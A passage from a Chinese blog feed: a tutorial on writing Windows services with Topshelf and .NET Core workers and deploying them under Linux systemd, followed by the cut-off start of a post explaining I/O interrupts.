<span class="keyword">bool</span> <span class="title">Start</span>(<span class="params">HostControl hostControl</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Log(<span class="string">"Starting"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">Stop</span>(<span class="params">HostControl hostControl</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Log(<span class="string">"Stopping"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;代码看起来是不是很简单？<br>&emsp;&emsp;这里我们的服务类继承了 <code>ServiceControl</code> 类（实际上并不需要，但是这可以为我们的工作打下良好的基础）。我们必须实现服务开始和服务结束两个方法，并且像以前一样记录日志。<br>&emsp;&emsp;在 <code>Program.cs</code> 文件的 <code>Main</code> 方法中，我们要写的代码也非常的简单。我们可以直接使用 <code>HostFactory.Run</code> 方法来启动服务。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HostFactory.Run(x =&gt; x.Service&lt;LoggingService&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这看起来真是太简单了。但这并不是 <code>HostFactory</code> 类的唯一功能。这里我们还可以设置</p>
<ul>
<li>服务的名称</li>
<li>服务是否自动启动</li>
<li>服务崩溃之后的重启时间</li>
</ul>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HostFactory.Run(x =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">            x.Service&lt;LoggingService&gt;();</span><br><span class="line">            x.EnableServiceRecovery(r =&gt; r.RestartService(TimeSpan.FromSeconds(<span class="number">10</span>)));</span><br><span class="line">            x.SetServiceName(<span class="string">"TestService"</span>);</span><br><span class="line">            x.StartAutomatically();</span><br><span class="line">         &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里其实能说的东西很多，但是我建议你还是自己去看看 <code>Topshelf</code> 的文档，学习一下其他的配置选项。基本上你能使用 Windows 命令行完成的所有操作，都可以使用代码来设置：<a href="https://topshelf.readthedocs.io/en/latest/configuration/config_api.html" target="_blank" rel="noopener">https://topshelf.readthedocs.io/en/latest/configuration/config_api.html</a>  </p>
<h2 id="部署服务"><a href="#部署服务" class="headerlink" title="部署服务"></a>部署服务</h2><p>&emsp;&emsp;和之前一样，我们需要针对不同的 Windows 环境发布我们的服务。在 Windows 命令提示符下，我们可以在项目目录中执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet publish -r win-x64 -c Release</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在我们就可以查看一下 <code>bin\Release\netcoreappX.X\win-x64\publish</code> 目录，我们会发现一个编译好的 exe，下面我们就会使用这个文件来安装服务。<br>&emsp;&emsp;在上一篇文章中，我们是使用 <code>SC</code> 命令来安装 Windows 服务的。使用 <code>Topshelf</code> 我们就不需要这么做了，<code>Topshelf</code> 提供了自己的命令行参数来安装服务。基本上使用代码能完成的配置，都可以使用命令行来完成。<br>&emsp;&emsp;你可以查看相关的文档：<a href="http://docs.topshelf-project.com/en/latest/overview/commandline.html" target="_blank" rel="noopener">http://docs.topshelf-project.com/en/latest/overview/commandline.html</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WindowsServiceExample.exe install</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里 <code>WindowsServiceExample.exe</code> 是我发布之后的 exe 文件。运行以上命令之后，服务应该就正常安装了！这里有一个小问题，我经常发现，即使配置了服务自动启动，但是服务安装之后，并不会触发启动操作。所有在服务安装之后，我们还需要通过以下命令来启动服务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WindowsServiceExample.exe start</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;在生产环境部署的时候，我的经验是在安装服务之后，等待 10 秒钟，再启动服务。</p>
</blockquote>
<h2 id="调试服务"><a href="#调试服务" class="headerlink" title="调试服务"></a>调试服务</h2><p>&emsp;&emsp;当我们是使用微软推荐方式的时候，我们会遇到了调试困难的问题。大多数情况下，无论是否在服务内部运行，我们都不得不使用命令行标志、<code>#IF DEBUG</code> 指令或者配置值来实现调试。然后使用 Hack 的方式在控制台程序中模拟服务。<br>&emsp;&emsp;因此，这就是为什么我们要使用 <code>Topshelf</code>。<br>&emsp;&emsp;如果我们的服务代码已经在 Visual Studio 中打开了，我们就可以直接启动调试。<code>Topshelf</code> 会模拟在控制台中启动服务。我们应该能在控制台中看到以下的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The TestService service is now running, press Control+C to exit.</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这确实符合了我们的需求。它启动了我们的服务，并像真正的 Windows 服务一样在后台运行。我们可以像往常一样设置断点，基本上它遵循的流程和正常安装的服务一样。<br>&emsp;&emsp;我们可以通过 ctrl+c，来关闭我们的应用，但是在运行服务执行 Stop 方法之前，它是不能被关闭的，这使我们可以调试服务的关闭流程。与调试指令和配置标志相比，这要容易的多。<br>&emsp;&emsp;这里需要注意一个问题。如果你收到的以下内容的消息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The TestService service is running and must be stopped before running via the console</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这意味着你尝试调试的服务实际上已经作为 Windows 服务被安装在系统中了，你需要停止（不需要卸载）这个正在运行的服务，才可以正常调试。</p>
<h2 id="后续-1"><a href="#后续-1" class="headerlink" title="后续"></a>后续</h2><p>&emsp;&emsp;在上一篇中，有读者指出 .NET Core 中实际上已经提供了一种完全不同的方式运行 Windows 服务。它的实质是利用了 ASP.NET Core 中引入的 “ 托管服务 ” 模型，并允许它们作为 Windows 服务来运行，这真的是非常的棒。</p>
<h1 id="使用-NET-Core-工作器方式"><a href="#使用-NET-Core-工作器方式" class="headerlink" title="使用 .NET Core 工作器方式"></a>使用 .NET Core 工作器方式</h1><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>&emsp;&emsp;这里首先你要确保你已经安装了 .NET Core 3.0 或以上版本。在我编写这篇文章的时候，.NET Core 3.1 刚刚发布，Visual Studio 应该会提示你升级到最新版本。但是如果你想要在 .NET Core 2.x 项目中使用这个方式，应该是行不通的。<br>&emsp;&emsp;如果你喜欢使用命令行创建项目，你就需要使用工作器（worker）类型创建项目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet new worker</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果你是一个和我一样喜欢使用 Visual Studio 的开发人员，那么你可以在 Visual Studio 中使用项目模板完成相同的功能。</p>
<figure class="image-box">
                <img src="65831-20191214083435124-1006535101.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这样做将创建出一个包含两个文件的项目。其中 <code>Program.cs</code> 文件是应用的启动 “ 引导程序 ” 。另外一个文件是 <code>worker.cs</code> 文件，在这个文件中，你可以编写你的服务逻辑。<br>&emsp;&emsp;这看起来应该是相当的容易，但是为这个程序添加额外的并行后台服务，你还需要添加一个类，并让它继承 <code>BackgroundService</code> 类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyNewBackgroundWorker</span> : <span class="title">BackgroundService</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> Task <span class="title">ExecuteAsync</span>(<span class="params">CancellationToken stoppingToken</span>)    </span></span><br><span class="line"><span class="function"></span>    &#123;        </span><br><span class="line">        <span class="comment">//Do something.     </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在 <code>Program.cs</code> 中，我们要做的只是把当前的 Worker 注册到服务集合（Service Collection）中即可。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.ConfigureServices((hostContext, services) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    services.AddHostedService&lt;Worker&gt;();</span><br><span class="line">    services.AddHostedService&lt;MyNewBackgroundWorker&gt;();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;实际上作为 “ 后台服务 ” 任务的运行程序，<code>AddHostedService</code> 方法已经在框架中存在了很长时间了。在之前我们已经完成的一篇关于<a href="https://dotnetcoretutorials.com/2019/01/13/hosted-services-in-asp-net-core/" target="_blank" rel="noopener"> ASP.NET Core 托管服务</a>的文章， 但是在当时场景中，我们托管是是整个应用，而非一个在你应用程序幕后运行的东西。  </p>
<h2 id="运行-调试我们的应用"><a href="#运行-调试我们的应用" class="headerlink" title="运行 / 调试我们的应用"></a>运行 / 调试我们的应用</h2><p>&emsp;&emsp;在默认的工作器（worker）模板中，已经包含了一个后台服务，这个服务可以将当前时间输出到控制台窗口。下面让我们点击 F5 来运行程序，看看我们能得到什么。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info: CoreWorkerService.Worker[0]      </span><br><span class="line">      Worker running at: 12/07/2019 08:20:30 +13:00</span><br><span class="line">info: Microsoft.Hosting.Lifetime[0]      </span><br><span class="line">      Application started. Press Ctrl+C to shut down.</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在我们启动程序之后，程序立刻就运行了！我们可以保持控制台的打开状态来调试应用，或者直接关闭窗口退出。相较于使用 “ Microsoft “ 方式来调试一个 Windows 服务，这简直就是天堂。<br>&emsp;&emsp;这里我们需要注意的另外一件事情是编写控制台程序的平台。在最后，我们不仅在控制台窗口输出了时间，还通过依赖注入创建了一个托管 worker。我们也可以使用依赖注入容器来注入仓储，配置环境变量，获取配置等。<br>&emsp;&emsp;但这里我们还没有做的事情是，将这个应用转换为 Windows 服务。  </p>
<h2 id="将我们的应用转换成-Windows-服务"><a href="#将我们的应用转换成-Windows-服务" class="headerlink" title="将我们的应用转换成 Windows 服务"></a>将我们的应用转换成 Windows 服务</h2><p>&emsp;&emsp;为了将应用转换成 Windows 服务，我们需要使用如下命令引入一个包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Microsoft.Extensions.Hosting.WindowsServices</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;下一步，我们需要修改 <code>Program.cs</code> 文件，添加 <code>UseWindowsService()</code> 方法的调用。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IHostBuilder <span class="title">CreateHostBuilder</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span> =&gt; </span><br><span class="line">    Host.CreateDefaultBuilder(args)    </span><br><span class="line">        .ConfigureServices((hostContext, services) =&gt;    </span><br><span class="line">        &#123;        </span><br><span class="line">            services.AddHostedService&lt;Worker&gt;();   </span><br><span class="line">         &#125;)</span><br><span class="line">         .UseWindowsService();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;以上就是所有需要变更的代码。<br>&emsp;&emsp;运行我们的程序，你会发现和之前的效果完全样。但是这里最大的区别是，我们可以将当前应用以 Windows 服务的形式安装了。<br>&emsp;&emsp;为了实现这一目的，我们需要发布当前项目。在当前项目目录中，我们可以运行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet publish -r win-x64 -c Release</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后我们就可以借助标准的 Windows 服务安装器来安装当前服务了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create TestService BinPath=C:\full\path\to\publish\dir\WindowsServiceExample.exe</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当前，你也可以使用 Windows 服务安装器的其他命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start TestServicesc stop TestServicesc delete TestService</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;最后检查一下我们的服务面板。</p>
<figure class="image-box">
                <img src="65831-20191214083446395-754761263.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;服务已经正常工作了。</p>
<h2 id="在-Linux-中运行服务"><a href="#在-Linux-中运行服务" class="headerlink" title="在 Linux 中运行服务"></a>在 Linux 中运行服务</h2><p>&emsp;&emsp;老实说，我没有太多的Linux经验，但是终归是需要了解一下…  </p>
<p>&emsp;&emsp;在 Linux 系统中, 如果你希望我们编写的 “ Windows ” 服务在 Linux 系统中作为服务运行，你需要做以下 2 步：</p>
<ul>
<li>使用 <code>Microsoft.Extensions.Hosting.Systemd</code> 替换之前的 <code>Microsoft.Extensions.Hosting.WindowsServices</code>。</li>
<li>使用 <code>UseSystemd()</code> 替换 <code>UseWindowsService()</code>。</li>
</ul>
<h1 id="Microsoft-vs-Topshelf-vs-NET-Core-Workers"><a href="#Microsoft-vs-Topshelf-vs-NET-Core-Workers" class="headerlink" title="Microsoft vs Topshelf vs .NET Core Workers"></a>Microsoft vs Topshelf vs .NET Core Workers</h1><p>&emsp;&emsp;到现在为止，我们已经介绍了借助 3 种不同的方式来创建 Windows 服务。<br>&emsp;&emsp;你可能会问 “ 好吧，那我到底应该选择哪一种 ？”<br>&emsp;&emsp;这里呢，我们可以首先把 “ Microsoft “ 这种老派学院式的方式抛弃。以为它的调试实在是太麻烦了，而且没有什么实际的用处。<br>&emsp;&emsp;然后剩下的就是 <code>Topshelf</code> 和 .NET Core 工作器两种方式了。在我看来，.NET Core 工作器，已经很好的融入 .NET Core 生态系统，如果你正在开发 ASP.NET Core 应用，那么使用 .NET Core 工作器就很有意义。最重要的是，当你创建一个后台服务的时候，你可以让它在一个 ASP.NET Core 网站中的任意位置运行，这非常的方便。但是缺点是安装。你必须使用 <code>SC</code> 命令来安装服务。这一部分 <code>Topshelf</code> 可能更胜一筹。<br>&emsp;&emsp;<code>Topshelf</code> 总体上将非常的友好，并且具有最好的安装方式，但是使用额外的库，也增加了学习的成本。<br>&emsp;&emsp;所以 <code>Topshelf</code> 和 .NET Core 工作器，大家可以自行选择，都是不错的方案。  </p>
<hr>
<h1 id="部署-Linux-服务"><a href="#部署-Linux-服务" class="headerlink" title="部署 Linux 服务"></a>部署 Linux 服务</h1><blockquote>
<p><a href="https://www.cnblogs.com/RainFate/p/12095793.html" target="_blank" rel="noopener">https://www.cnblogs.com/RainFate/p/12095793.html</a></p>
</blockquote>
<p>环境：一台全新的 Centos 7.7.1908 系统  </p>
<h2 id="安装-net-core相关环境"><a href="#安装-net-core相关环境" class="headerlink" title="安装 .net core相关环境"></a>安装 .net core相关环境</h2><p>参考：<a href="https://docs.microsoft.com/zh-cn/dotnet/core/install/linux-package-manager-centos7" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/core/install/linux-package-manager-centos7</a>  </p>
<p>注册 Microsoft 密钥和源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rpm -Uvh https://packages.microsoft.com/config/centos/7/packages-microsoft-prod.rpm</span><br></pre></td></tr></table></figure>

<p>安装 .NET Core SDK：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install dotnet-sdk-3.0  -y</span><br></pre></td></tr></table></figure>

<p>安装完成之后可以输入 <code>dotnet --version</code> 查看是否可以返回对应版本  </p>
<h2 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h2><p>程序代码需要引用 <code>Microsoft.Extensions.Hosting.Systemd</code> Nuget包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Microsoft.Extensions.Hosting.Systemd</span><br></pre></td></tr></table></figure>

<p>修改 <code>Program.cs</code> 文件，添加 <code>UseSystemd()</code> 方法调用，可以和 <code>UseWindowsService()</code> 共存</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IHostBuilder <span class="title">CreateHostBuilder</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span> =&gt;</span><br><span class="line">    Host.CreateDefaultBuilder(args)</span><br><span class="line">        .ConfigureServices((hostContext, services) =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">            services.AddHostedService&lt;Worker&gt;();</span><br><span class="line">        &#125;)</span><br><span class="line">          .UseWindowsService()</span><br><span class="line">          .UseSystemd();</span><br></pre></td></tr></table></figure>

<p>然后把发布文件移至 Linux 系统</p>
<h2 id="部署服务-1"><a href="#部署服务-1" class="headerlink" title="部署服务"></a>部署服务</h2><p>Linux 的服务是通过 <code>systemd</code> 守护进程部署的。现在在系统中我们有了一个发布后的应用程序，我们需要为 systemd 创建配置文件部署服务。步骤如下：<br>创建一个 <strong>.service</strong> 文件（我们要部署服务，因此需要 <strong>.service</strong> 文件），填入以下内容。可以在 Linux 中直接创建或者通过 Windows 创建然后拷贝至 Linux。<br><a href="https://github.com/RainFate/WindowsServiceDemo/blob/Init/WorkerService/%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85%E5%8D%B8%E8%BD%BD/Linux/testapp.service" target="_blank" rel="noopener">参考链接</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description = my test app</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type = notify</span><br><span class="line">ExecStart = /usr/bin/dotnet/home/demo/WorkerService.dll</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Description</code>：描述，看个人需要是否添加。不需要可以去掉。只留下 <code>[Service]</code> 和 <code>[Install]</code></li>
<li><code>Type=notify</code>：当前服务启动完毕，会通知 <code>Systemd</code>，再继续往下执行</li>
<li><code>ExecStart</code>：启动当前服务的命令，程序如何启动，第一个路径是固定路径。第二个路径是应用程序的 dll 路径（可以自定义）</li>
<li><code>WantedBy</code>：表示该服务所在的 Target 服务组；<code>multi-user.target</code> 表示多用户命令行状态。</li>
</ul>
<p>把 <strong>.service</strong> 文件移动至 <strong>/etc/systemd/system/</strong> 固定目录下，假设自定义文件名称为：<strong>testapp.service</strong>（如果使用其他名称，请更改 testapp）</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<p>使用 <code>systemctl</code> 命令重新加载新的配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>查看相关服务状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status testapp</span><br></pre></td></tr></table></figure>

<p>您应该看到类似以下的内容：</p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<p>这表明您已注册的新服务已禁用，我们可以通过运行以下命令来启动我们的服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start testapp.service</span><br></pre></td></tr></table></figure>

<p>重新运行 <code>sudo systemctl status testapp</code> 查看服务状态显示已激活正在运行中</p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<p>设置服务开机自启</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable testapp.service</span><br></pre></td></tr></table></figure>

<p>到此我们的服务已经完整的部署到了 Linux 系统中<br>现在我们有一个运行了 <code>systemd</code> 的应用程序，我们可以看看日志记录集成。使用 <code>systemd</code> 的好处之一是可以使用 <code>journalctl</code> 访问的集中式日志记录系统。<br>首先，我们可以使用 <code>journalctl</code>（访问日志的命令）查看服务日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl -u testapp</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>


<p>可以看到我们的程序正在运行，可以使用 ↑ ↓ ← → 查看日志内容，或者使用 <code>grep</code> 搜索，q 键退出。</p>
<h2 id="卸载自定义服务"><a href="#卸载自定义服务" class="headerlink" title="卸载自定义服务"></a>卸载自定义服务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">servicename=testapp.service</span><br><span class="line"></span><br><span class="line">systemctl stop $servicename</span><br><span class="line">systemctl disable $servicename</span><br><span class="line">rm -rf /etc/systemd/system/$servicename</span><br><span class="line">rm -rf /etc/systemd/system/$servicename symlinks that might be related</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl reset-failed</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> dotNET </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[I/O 中断原理]]></title>
      <url>/2019/12/14/IOInterruptionPrinciple/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/Jack-Blog/p/12038716.html" target="_blank" rel="noopener">https://www.cnblogs.com/Jack-Blog/p/12038716.html</a></p>
</blockquote>
<p>&emsp;&emsp;本篇文章会对中断操作的原理进行说明。  </p>
<a id="more"></a>

<h1 id="什么是中断"><a href="#什么是中断" class="headerlink" title="什么是中断"></a>什么是中断</h1><p>&emsp;&emsp;中断指当出现需要时，CPU 暂时停止当前程序的执行转而执行处理新情况的程序和执行过程。即在程序运行过程中，系统出现了一个必须由 CPU 立即处理的情况，此时，CPU 暂时中止程序的执行转而处理这个新的情况的过程就叫做中断。<br>&emsp;&emsp;我们知道 CPU 是按指令顺序进行执行的，操作系统每过大约 15ms 会发生一次线程调度（Windows 下），根据线程优先级先调度优先级高的线程。但是实际情况并没有那么简单，若我们接收到一个网络请求，如果要等当前线程执行完或 15ms 线程调度之后才去处理网络请求，网卡缓冲区很有可能会被占满，此时就发生了丢包。  </p>
<h1 id="中断类型"><a href="#中断类型" class="headerlink" title="中断类型"></a>中断类型</h1><p>&emsp;&emsp;中断分为硬件中断和软件中断。</p>
<h2 id="硬件中断"><a href="#硬件中断" class="headerlink" title="硬件中断"></a>硬件中断</h2><p>&emsp;&emsp;硬件中断即为硬件发出的中断信号，如 I/O 中断和硬件失效中断。</p>
<ul>
<li>I/O 中断：由 I/O 控制器产生，用于发送信号通知操作完成等信号。</li>
<li>硬件失效中断：如掉电或存储器奇偶错之类的故障。</li>
</ul>
<h2 id="软件中断"><a href="#软件中断" class="headerlink" title="软件中断"></a>软件中断</h2><p>&emsp;&emsp;软件中断即为非硬件发出的中断信号，如程序中断和时钟中断。</p>
<ul>
<li>程序中断：一些指令产生的异常（如算数移除、除数为 0 等）。</li>
<li>时钟中断：由处理器内部的计时器产生，允许操作系统以一定规程执行函数。<blockquote>
<p>&emsp;&emsp;我们提到了操作系统每过大约 15ms 会进行一次线程调度，就是利用时钟中断来实现的。</p>
</blockquote>
</li>
</ul>
<h1 id="I-O中断流程"><a href="#I-O中断流程" class="headerlink" title="I/O中断流程"></a>I/O中断流程</h1><p>&emsp;&emsp;本篇文章还是主要解释前几篇文章提到的 I/O 中断进行解释说明，因此仅以 I/O 中断举例，但是中断的原理和流程都是相似的。<br>&emsp;&emsp;I/O 中断通过中断处理器执行中断操作。当外部设备的 I/O 模块准备好时，它会发送给 CPU 一个中断信号，CPU 则会 “ 立即 ” 做出响应，暂停当前程序的处理去服务该 I/O 设备的程序。</p>
<blockquote>
<p>&emsp;&emsp;也可能不是立即，比如同时存在多个中断，则根据实际的中断算法决定，是按中断先后顺序执行中断操作，还是按中断优先级执行。<br>&emsp;&emsp;I/O 中断时硬件中断，需要硬件支持来接收中断信号。</p>
</blockquote>
<h2 id="无中断"><a href="#无中断" class="headerlink" title="无中断"></a>无中断</h2><p>&emsp;&emsp;为了更好的说明中断带来的性能提升，我们先描述一下没有中断时程序如何处理 I/O 操作。</p>
<figure class="image-box">
                <img src="580757-20191214121306882-165841570.png" alt title class>
                <p></p>
            </figure>

<ul>
<li><p>当我们程序需要从硬盘读取一个文件时，会先检查内核缓存中是否有数据，若没有数据，则执行实际 I/O 操作。在 I/O 操作执行时，我们的用户线程将阻塞等待数据从硬盘写到内存中。对于用户来说线程是被阻塞的。</p>
</li>
<li><p>在实际的 I/O 操作过程中，若没有中断操作，CPU 会不断轮询检查 I/O 操作是否完成，若 I/O 操作没有完成则继续调度其他线程，过一会儿再来检查。若操作完成，CPU 将线程加入到线程就绪队列中并恢复线程上下文信息。</p>
</li>
<li><p>线程处于就绪队列，可以被操作系统调度从而继续执行读操作，此时会将数据从操作系统内核缓存读取到用户缓存中。</p>
<h2 id="有中断"><a href="#有中断" class="headerlink" title="有中断"></a>有中断</h2><figure class="image-box">
                <img src="580757-20191214121702241-973799984.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>当我们程序需要从硬盘读取一个文件时，会先检查内核缓存中是否有数据，若没有数据，则执行实际 I/O 操作。在 I/O 操作执行时，我们的用户线程将阻塞等待数据从硬盘写到内存中。对于用户来说线程是被阻塞的。</p>
</li>
<li><p>在实际的 I/O 操作过程中，CPU 向 I/O 模块（DMA 控制器）发送读指令，然后就去调度其他线程。</p>
</li>
<li><p>当 I/O 模块（DMA 控制器）I/O 执行完成后，会产生中断信号在通知 CPU，CPU 将线程加入到线程就绪队列中并恢复线程上下文信息。</p>
</li>
<li><p>线程处于就绪队列，可以被操作系统调度从而继续执行读操作，此时会将数据从操作系统内核缓存读取到用户缓存中。</p>
</li>
</ul>
<p>&emsp;&emsp;由此可知，有中断还是没有中断对于用户来说线程都是阻塞的，对于操作系统内核来说通过中断方式主动通知 CPU 的方式减少了线程轮询判断，提高了线程执行效率。<br>&emsp;&emsp;当然，为了进一步提高线程利用率，此时我们可以通过异步操作 API 执行 I/O 操作。<br>&emsp;&emsp;比如 .Net Framework 4.5 的 <code>async</code> 和 <code>await</code> 关键字，当调用异步操作后，API 内部保存了相关状态机信息（回调信息），线程继续执行其他操作，当操作系统内核读取数据完成时，线程调用回调方法恢复到 <code>await</code> 的后续操作。整个过程中线程不会因为阻塞带来导致性能损失。</p>
<h1 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h1><p>&emsp;&emsp;当 I/O 设备完成一次 I/O 操作时，发生以下事件：</p>
<ol>
<li>开始 I/O 操作前，处理器将当前处理的相关信息如指令地址、必要的状态信息等保存到栈中，使得中断后可以恢复执行。</li>
<li>I/O 操作完成后，设备给处理器发送一个中断信号。</li>
<li>处理器响应中断信号。</li>
